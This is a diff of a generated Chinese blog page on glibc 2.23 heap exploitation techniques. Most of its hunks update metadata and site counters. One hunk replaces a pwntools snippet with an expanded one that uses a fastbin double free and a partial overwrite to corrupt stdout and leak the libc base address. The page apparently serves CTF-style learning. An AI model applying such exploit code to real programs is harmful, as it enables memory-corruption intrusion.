@@ -127,7 +127,7 @@
 <meta property="og:site_name" content="w4rd3n">
 <meta property="og:description" content="house全家桶 house_of_force house_of_force利用过程就是改写top chunk为一个很大的值,然后通过malloc一个计算后的值进行任意地址分配. 即通过malloc一个chunk,使得top chunk缩减到需要控制的区域,然后再次malloc就可以malloc出需要控制的区域. 例如:想要改写的变量位置在target,top chunk的位置在top,再">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-01-05T13:05:42.408Z">
+<meta property="og:updated_time" content="2021-01-10T07:57:36.386Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-pwn-Linux-glibc-2.23-攻击方式">
 <meta name="twitter:description" content="house全家桶 house_of_force house_of_force利用过程就是改写top chunk为一个很大的值,然后通过malloc一个计算后的值进行任意地址分配. 即通过malloc一个chunk,使得top chunk缩减到需要控制的区域,然后再次malloc就可以malloc出需要控制的区域. 例如:想要改写的变量位置在target,top chunk的位置在top,再">
@@ -517,7 +517,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">16 分钟</span>
+                <span title="阅读时长">17 分钟</span>
               
             </div>
           
@@ -636,7 +636,7 @@
 <p>也可以通过<code>off_by_one</code>修改下一个<code>chunk</code>的<code>size</code>成员<code>P</code>标志位,从而实现<code>unlink</code>漏洞利用.</p>
 <h3 id="攻击stdout泄露libc">攻击stdout泄露libc</h3>
 <p>通过残留的<code>unsorted bin</code>地址,部分写爆破出<code>stdout</code>附件的地址,搭配<code>fastbin attack</code>或者<code>tcache attack</code>攻击<code>stdout</code>泄露<code>libc</code>.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>, p16(<span class="number">0xb5dd</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line"><span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, <span class="number">2</span>, p16(<span class="number">0xb5dd</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">try</span> :</span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    r.sendline(str(<span class="number">4</span>))</span><br><span class="line">    r.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    r.sendline(str(<span class="number">4</span>))</span><br><span class="line">    r.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    r.sendline(str(<span class="number">0x54</span>))</span><br><span class="line">    r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    r.send(str(p8(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(<span class="number">0xfbad3887</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0x88</span>)))</span><br><span class="line">    libc = u64(r.recv()[:<span class="number">8</span>]) - <span class="number">0x3c48e0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#code</span></span><br><span class="line"><span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -759,7 +759,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">168</span>
+                    <span class="site-state-item-count">167</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -895,9 +895,7 @@
                     
                       
                     
-                      
-                    
-                    <span class="site-state-item-count">40</span>
+                    <span class="site-state-item-count">39</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
@@ -979,7 +977,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">882k</span>
+    <span title="站点总字数">880k</span>
   
 
   
@@ -988,7 +986,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">13:22</span>
+    <span title="站点阅读时长">13:20</span>
   
 </div>
 
@@ -1637,7 +1635,7 @@
   //$("body").backstretch("/images/background.jpg");
   </script>
   
-  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
 </html>
